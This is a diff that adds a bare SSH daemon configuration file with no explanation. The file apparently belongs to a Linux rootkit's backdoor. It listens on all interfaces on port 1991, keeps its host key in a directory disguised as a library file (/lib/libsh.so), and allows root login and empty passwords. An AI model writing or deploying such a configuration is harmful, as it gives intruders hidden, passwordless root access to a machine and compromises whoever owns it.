@@ -1,0 +1,25 @@
+Port 1991
+ListenAddress 0.0.0.0
+HostKey /lib/libsh.so/shhk
+RandomSeed /lib/libsh.so/shrs
+ServerKeyBits 768
+LoginGraceTime 600
+KeyRegenerationInterval 3600
+PermitRootLogin yes
+IgnoreRhosts yes
+StrictModes yes
+QuietMode no
+X11Forwarding yes
+X11DisplayOffset 10
+FascistLogging no
+PrintMotd no
+KeepAlive yes
+SyslogFacility DAEMON
+RhostsAuthentication no
+RhostsRSAAuthentication yes
+RSAAuthentication yes
+PasswordAuthentication yes
+PermitEmptyPasswords yes
+UseLogin no
+CheckMail no
+
